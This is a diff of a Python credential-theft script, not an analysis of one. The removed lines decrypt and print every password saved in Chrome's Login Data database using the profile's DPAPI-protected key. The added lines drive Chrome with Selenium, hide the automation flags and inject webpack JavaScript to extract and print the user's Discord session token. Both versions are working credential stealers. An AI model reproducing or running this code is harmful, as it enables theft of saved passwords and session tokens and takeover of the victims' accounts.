@@ -1,46 +1,67 @@
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.support.ui import WebDriverWait
+from webdriver_manager.chrome import ChromeDriverManager
+import time
 import os
-import json
-import base64
-from Crypto.Cipher import AES
-import win32crypt
-import sqlite3
-import shutil
 
-try:
-    local_state = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State')
-    with open(local_state, 'r', encoding='utf-8') as f:
-        encrypted_key = json.load(f)['os_crypt']['encrypted_key']
+def get_discord_token():
+    profile_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
     
-    key = win32crypt.CryptUnprotectData(base64.b64decode(encrypted_key)[5:], None, None, None, 0)[1]
+    print(f"Using Chrome profile: {profile_path}")
+    print("Starting browser...")
     
-    db_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
-    temp_db = 'ChromePasswords.db'
-    shutil.copy2(db_path, temp_db)
+    o = Options()
+    o.add_argument(f'--user-data-dir={profile_path}')
+    o.add_argument('--profile-directory=Default')
+    o.add_argument('--no-sandbox')
+    o.add_argument('--disable-dev-shm-usage')
+    o.add_argument('--disable-blink-features=AutomationControlled')
+    o.add_experimental_option('excludeSwitches', ['enable-logging', 'enable-automation'])
+    o.add_experimental_option('useAutomationExtension', False)
     
-    conn = sqlite3.connect(temp_db)
-    cursor = conn.cursor()
-    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
-    
-    print("\n" + "="*100)
-    print(f"{'URL':<50} {'USERNAME':<25} {'PASSWORD':<25}")
-    print("="*100)
-    
-    for url, username, encrypted_pass in cursor.fetchall():
-        if encrypted_pass:
-            try:
-                nonce = encrypted_pass[3:15]
-                ciphertext = encrypted_pass[15:-16]
-                cipher = AES.new(key, AES.MODE_GCM, nonce)
-                password = cipher.decrypt(ciphertext).decode(errors='ignore')
-                print(f"{url:<50} {username:<25} {password:<25}")
-            except Exception as e:
-                print(f"{url:<50} {username:<25} [DECRYPT FAILED]")
-    
-    conn.close()
-    os.remove(temp_db)
-    print("="*100 + "\n")
+    try:
+        driver = webdriver.Chrome(
+            service=Service(ChromeDriverManager().install()),
+            options=o
+        )
+        
+        print("Opening Discord...")
+        driver.get('https://discord.com/app')
+        
+        print("Waiting for Discord to load...")
+        time.sleep(6)
+        
+        print("Extracting token...")
+        token = driver.execute_script("""
+            return (webpackChunkdiscord_app.push(
+                [[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m
+            ).find(m=>m?.exports?.default?.getToken!==void 0)
+             .exports.default.getToken()
+        """)
+        
+        driver.quit()
+        
+        return token
+        
+    except Exception as e:
+        print(f"Error: {e}")
+        try:
+            driver.quit()
+        except:
+            pass
+        return None
 
-except FileNotFoundError:
-    print("Chrome not found! Are you sure you're using Chrome?")
-except Exception as e:
-    print(f"Error: {e}")
+if __name__ == '__main__':
+    token = get_discord_token()
+    
+    if token:
+        print("\n" + "="*60)
+        print("TOKEN FOUND:")
+        print("="*60)
+        print(token)
+        print("="*60)
+    else:
+        print("\nFailed to get token.")
+        print("Make sure you're logged into Discord in Chrome.")
